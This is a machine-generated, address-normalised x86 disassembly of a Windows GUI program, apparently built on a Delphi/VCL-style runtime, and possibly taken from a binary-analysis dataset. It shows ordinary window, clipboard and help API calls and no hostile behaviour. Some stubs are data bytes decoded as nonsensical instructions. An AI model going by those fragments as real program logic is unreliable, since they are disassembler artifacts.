mov esi eax
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42cd01
jmp sub_403a3c
sub_42cd08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ce08
jmp sub_403a3c
sub_42ce84
jmp sub_403a3c
sub_42ce8b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42cf16
jmp sub_403a3c
sub_42d2a4
call sub_4032e8
retn
sub_42d62c
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42d640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_4042a8
pop esi
pop ebx
retn
sub_42d65c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42d674
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42d6a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_4042a8
pop esi
pop ebx
retn
sub_42d6c4
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42d674
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42d7be
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42daa6
jmp sub_403a3c
sub_42daad
pop ebp
retn
sub_42e83b
[ edx ]
sub_42ee52
jmp sub_403788
sub_42ef0b
jmp sub_403a3c
sub_42ef12
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ef18
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42ee8c
sub_42ef28
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42ee8c
sub_42ef38
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42ee8c
pop ebp
retn 0x8
sub_42ef50
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42f07c
push ebx
mov ebx eax
mov eax ebx
call sub_445a70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f090
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f0c4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42f1c8
jmp sub_403a3c
sub_42f1cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f372
jmp sub_403a3c
sub_42f379
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f383
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42f398
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_442d58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f3b4
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_442d58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f3d0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_442d58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f3ec
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_442d58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42f408
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_443a38
sub_42f41c
mov al [ eax + 0x220 ]
retn
sub_42f585
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42f59d
jmp sub_403a3c
sub_42f94f
retn
sub_42f950
jmp sub_403a3c
j_sub_42f94f
jmp sub_42f94f
sub_42f957
pop ebp
retn
sub_42f95c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dc0
mov eax [ r-xdata ]
call sub_416dac
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_42f9b9
jmp sub_403a3c
sub_42f9c0
pop ebp
retn
sub_42f9c4
sub [ rw-data ] 0x1
retn
sub_42f9fd
jmp sub_403a3c
sub_42fa04
pop ebp
retn
sub_42fa08
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42fa84
retn
sub_42fa85
jmp sub_403a3c
j_sub_42fa84
jmp sub_42fa84
sub_42fa8c
pop ebp
retn
sub_42fa90
sub [ rw-data ] 0x1
retn
sub_42fa98
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4032e8
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42fb63
pop ebp
retn
sub_42fbb5
jmp sub_403a3c
sub_42fbbc
pop ebp
retn
sub_42fbc0
sub [ rw-data ] 0x1
retn
sub_42fc1c
jmp sub_403a3c
sub_42fc23
pop ebp
retn
sub_42fc28
sub [ rw-data ] 0x1
retn
sub_42fc84
jmp sub_403a3c
sub_42fc8b
pop ebp
retn
sub_42fc90
sub [ rw-data ] 0x1
retn
sub_42fcf1
jmp sub_403a3c
sub_42fcf8
pop ebp
retn
sub_42fcfc
sub [ rw-data ] 0x1
retn
sub_42fd48
jmp sub_403a3c
sub_42fd4f
pop ebp
retn
sub_42fd54
sub [ rw-data ] 0x1
retn
sub_42fd81
jmp sub_403a3c
sub_42fd88
pop ebp
retn
sub_42fd8c
sub [ rw-data ] 0x1
retn
sub_4312ac
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d258
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
xor eax eax
mov [ rw-data ] eax
sub_4314d4
push ebx
mov ebx eax
mov eax ebx
call sub_431560
mov [ ebx + 0x214 ] eax
mov eax ebx
call sub_443834
pop ebx
retn
sub_4316e3
jmp sub_403a3c
sub_4316ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4316f4
mov ecx [ eax + 0x210 ]
call sub_4315b0
retn
sub_431700
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_4315b0
retn
sub_431798
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_443a38
sub_4317ac
cmp dl [ eax + 0x21d ]
je r-xdata
retn
mov [ eax + 0x21d ] dl
call sub_443a38
sub_4317c0
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_4317d4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_431b00
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_4034e4
pop esi
retn
sub_431bbc
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_432184
retn
xor edx edx
call sub_432184
retn
sub_431c10
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_431e3e
jmp sub_403a3c
sub_431e45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432100
jmp sub_403a3c
sub_432107
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4324cc
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44573c
retn
mov [ edx + 0xc ] 0x1
retn
sub_4325d7
jmp sub_403a3c
sub_4325ec
call sub_444a84
retn
sub_4326a8
push ebx
mov ebx eax
mov eax ebx
call sub_4459cc
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_443a38
sub_432710
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_432730
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_432750
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_432770
push ebx
mov ebx eax
cmp [ ebx + 0x25a ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_432794
push ebx
mov ebx eax
mov eax ebx
call sub_441d6c
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_432a08
sub_4329fa
jmp sub_403a3c
sub_432a01
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_432a48
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_443a38
sub_432b9c
jmp sub_403788
sub_432bda
jmp sub_403a3c
sub_432be1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c28
cmp edx [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] edx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_432e80
sub_432c74
cmp dx [ eax + 0x23a ]
je r-xdata
retn
mov [ eax + 0x23a ] dx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_432e80
sub_432c90
cmp dl [ eax + 0x235 ]
je r-xdata
retn
mov [ eax + 0x235 ] dl
call sub_443a38
sub_432ca4
cmp dl [ eax + 0x236 ]
je r-xdata
retn
mov [ eax + 0x236 ] dl
call sub_443a38
sub_432e2c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_432be8
mov dx 0x1
mov eax ebx
call sub_432e4c
sub_432f5b
jmp sub_403a3c
sub_432f62
pop ebp
retn
sub_432f64
sub [ rw-data ] 0x1
retn
sub_432fd3
jmp [ edi ]
sub_433274
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43328c
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_4332d0
push ebx
mov ebx eax
mov eax ebx
call sub_433910
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_4338ff
jmp sub_403a3c
sub_433910
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42b340
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_4332a0
sub_433967
jmp sub_403a3c
sub_43396e
pop ebp
retn
sub_433970
sub [ rw-data ] 0x1
retn
sub_4354eb
add [ eax ] cl
retn
sub_4354ee
inc esp
add [ esp + ebp * 8 ] bh
inc ebx
add ah ch
nop
inc ebx
add [ esp + ebp * 8 + 0x43 ] bl
add [ eax ] bl
retn
sub_4354fe
inc esp
add [ ecx - 0x12afffbc ] bh
inc ebx
add [ eax + 0x7c0043ed ] dl
in al dx
inc ebx
add [ ebx + eax * 8 ] ch
inc esp
add [ eax ] dh
retn
sub_435516
inc esp
add [ eax + 0x100043ec ] ah
0x54110043 0x7542
sub_4366bc
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_4368a8
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_436eb4
sub_4368bc
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_436eb4
mov eax ebx
call sub_443a38
sub_4368e0
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_443a38
sub_4368f4
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_443a38
sub_436938
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_443a38
sub_436a39
jmp sub_403a3c
sub_436a40
pop ebx
pop ecx
pop ebp
retn
sub_436b58
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4464d0
push eax
call SetWindowTextA
pop ebx
retn
sub_436b74
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_436c1a
jmp sub_403a3c
sub_436c21
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436cba
jmp sub_403a3c
sub_436e33
jmp sub_403a3c
sub_436e98
push ebx
mov ebx eax
mov eax ebx
call sub_43694c
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_443834
pop ebx
retn
sub_436f98
push ebx
mov ebx eax
mov eax ebx
call sub_43f8bc
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_437090
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_4034e4
sub_437140
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_4371c2
jmp sub_403a3c
sub_4371c9
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4372b4
jmp sub_403a3c
sub_4372bb
pop ebx
pop ecx
pop ebp
retn
sub_4373af
jmp sub_403a3c
sub_4373b6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437433
jmp sub_403a3c
sub_43743a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437590
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_43fc8c
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_4375e0
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_437714
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_443a38
sub_437748
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_437750
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_437758
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_437784
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_440e64
sub_4378dc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_4378fc
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_443a38
sub_437bc7
jmp sub_403788
sub_437bcc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_437e58
jmp sub_403a3c
sub_437e5f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437e68
push ebx
mov ebx eax
mov eax ebx
call sub_43f8bc
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_437f35
jmp sub_403a3c
sub_437f3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_437f48
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_437fc4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_4380de
jmp sub_403a3c
sub_438128
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_4381b3
jmp sub_403a3c
sub_4381ba
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4381ec
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_4381f8
mov [ eax + 0x210 ] edx
retn
sub_438249
jmp sub_403a3c
sub_438250
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438318
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_443a38
sub_43836c
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_438381
mov eax [ eax + 0x238 ]
retn
sub_438381
push 0x0
xor ecx ecx
mov edx 0x154
call sub_440e64
retn
sub_4386c0
jmp sub_403a3c
sub_4386c7
pop ebx
mov esp ebp
pop ebp
retn
sub_438a84
jmp sub_403a3c
sub_438a8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438c49
jmp sub_403a3c
sub_438c50
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438c5c
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_438e40
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_438e4c
mov eax [ r-xdata ]
retn
sub_43907d
jmp sub_403a3c
sub_43908c
retn
sub_439142
jmp sub_403a3c
sub_4391ec
mov eax [ r-xdata ]
retn
sub_4391f4
xor eax eax
retn
sub_439218
retn
sub_439330
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_443a38
sub_4393a8
push ebx
mov ebx eax
mov eax ebx
call sub_456c04
test eax eax
je r-xdata
mov eax ebx
call sub_4411ec
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4393cc
xor eax eax
retn
sub_439493
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x604d173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4394ac
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_4034e4
sub_43959d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4395a6
jmp sub_403a3c
j_sub_43959d
jmp sub_43959d
sub_4395ad
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439758
push ebx
mov ebx eax
mov eax ebx
call sub_43f8bc
mov eax ebx
call sub_4411ec
pop ebx
retn
sub_43976c
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_439778
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_443a38
sub_43978c
test dl dl
je r-xdata
xor edx edx
call sub_4397a0
retn
mov dl 0x1
call sub_4397a0
retn
sub_43987c
push ebx
mov ebx eax
mov eax ebx
call sub_444a84
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_439890
call sub_443a38
retn
sub_439926
jmp sub_403a3c
sub_43992d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439934
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_439969
jmp sub_403a3c
sub_439970
pop ebp
retn
sub_439974
sub [ rw-data ] 0x1
retn
sub_439ad1
jmp sub_403a3c
sub_439ad8
pop ebp
retn
sub_439adc
sub [ rw-data ] 0x1
retn
sub_439af5
add eax 0xffffffe0
jmp sub_43a0dc
sub_439afd
add eax 0xffffffe0
jmp sub_43a144
sub_439b05
add eax 0xffffffe0
jmp sub_43a258
sub_439b0d
add eax 0xffffffe0
jmp sub_43a2cc
sub_439b15
add eax 0xffffffe0
jmp sub_439d88
sub_439b1d
add eax 0xffffffe0
jmp sub_439d9c
sub_439b25
add eax 0xffffffe0
jmp sub_439e14
sub_439b2d
add eax 0xffffffe0
jmp sub_439eb8
sub_439b35
add eax 0xffffffe0
jmp sub_439ebc
sub_439b3d
add eax 0xffffffe0
jmp sub_439f44
sub_439b45
add eax 0xffffffe0
jmp sub_43a08c
sub_439b4d
add eax 0xffffffe0
jmp sub_43a090
sub_439b55
add eax 0xffffffe0
jmp sub_43a0ac
sub_439b5d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059d4
sub_439b67
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059fc
sub_439b71
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a10
sub_439d45
jmp sub_403a3c
sub_439d4c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439d88
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40408c
pop ebx
retn
sub_439e03
jmp sub_403a3c
sub_439e0a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439e9c
jmp sub_403a3c
sub_439ea3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439eb8
mov al 0x1
retn
sub_439f37
jmp sub_403a3c
sub_439f3e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a03c
jmp sub_403a3c
sub_43a043
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a08c
mov [ eax + 0xc ] edx
retn
sub_43a090
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43a134
jmp sub_403a3c
sub_43a13b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a23a
jmp sub_403a3c
sub_43a241
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a2ba
jmp sub_403a3c
sub_43a2c1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a34c
jmp sub_403a3c
sub_43a353
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a447
jmp sub_403a3c
sub_43a44e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a510
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43a45c
call EnumWindows
retn
sub_43a5a2
jmp sub_403a3c
sub_43a5a9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43a5b4
xor eax eax
retn
sub_43a6ad
jmp sub_403a3c
sub_43a6b4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a79e
jmp sub_403a3c
sub_43a7a5
pop ebp
retn
sub_43a7fa
jmp sub_403a3c
sub_43a801
pop ebp
retn
sub_43adae
inc esp
add [ esp + ebp * 8 ] bh
inc ebx
add [ eax ] dl
retn
sub_43adb6
inc esp
add [ esp + ebp * 8 + 0x43 ] bl
add [ eax ] bl
retn
sub_43adbe
inc esp
add [ eax - 0x13 ] dh
inc ebx
add [ eax - 0x13 ] dl
inc ebx
add [ eax + 0x7c0043ed ] dl
in al dx
inc ebx
add [ ebx + eax * 8 ] ch
inc esp
add [ eax ] dh
retn
sub_43add6
inc esp
add [ eax + 0x100043ec ] ah
0x54120043 0x6f43
sub_43b984
jmp r-xdata
sub_43b986
0xe8ffe9ff 0xe7ff
sub_43b98d
jmp esi
sub_43bceb
add [ eax ] cl
retn
sub_43bcee
inc esp
add [ esp + ebp * 8 ] bh
inc ebx
add [ eax ] dl
retn
sub_43bcf6
inc esp
add [ esp + ebp * 8 + 0x43 ] bl
add [ eax ] bl
retn
sub_43bcfe
inc esp
add [ ecx - 0x12afffbc ] bh
inc ebx
add [ eax + 0x7c0043ed ] dl
in al dx
inc ebx
add [ ebx + eax * 8 ] ch
inc esp
add [ eax ] dh
retn
sub_43bd16
inc esp
add [ eax + 0x100043ec ] ah
0x54150043 0x6957
sub_43bf30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rol [ ebx ] 0xe4
retn 0x43
sub_43bf40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop edx
rol [ ebx ] 0xd2
retn 0x43
sub_43c77e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43c78b
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43c798
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43c7a5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43c7b2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43c7bf
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43c7cc
add eax 0xffffff8c
jmp sub_44a214
sub_43c7d4
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4059d4
sub_43c7de
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4059fc
sub_43c7e8
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a10
sub_43cda3
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417020
retn
sub_43cdc0
push 0x15
mov ecx rw-data
call sub_416fe0
retn
sub_43ce58
call GetCapture
call sub_43cb90
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43d0bc
push ebx
push eax
push sub_43d240
call sub_41e1e4
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43d0d4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43d104
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41e298
pop ebx
retn
sub_43d1e2
jmp sub_403788
sub_43d214
xor eax eax
retn
sub_43d218
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43d230
retn
sub_43d234
mov eax [ rw-data ]
retn
sub_43d23c
retn
sub_43d26a
jmp sub_403788
sub_43d26f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d28c
call sub_403540
xor eax eax
mov [ rw-data ] eax
retn
sub_43d29c
call sub_40353c
xor eax eax
mov [ rw-data ] eax
retn
sub_43d2ac
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43d35c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43d374
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43d3c0
retn
sub_43d578
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4034e4
pop esi
retn
sub_43d58c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4034e4
pop esi
retn
sub_43d5a0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43d5ac
mov eax 0x4
retn
sub_43d5b4
retn
sub_43e1a5
jmp sub_403788
sub_43e492
jmp sub_403a3c
sub_43e504
jmp sub_403a3c
sub_43e510
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43e238
sub_43e68f
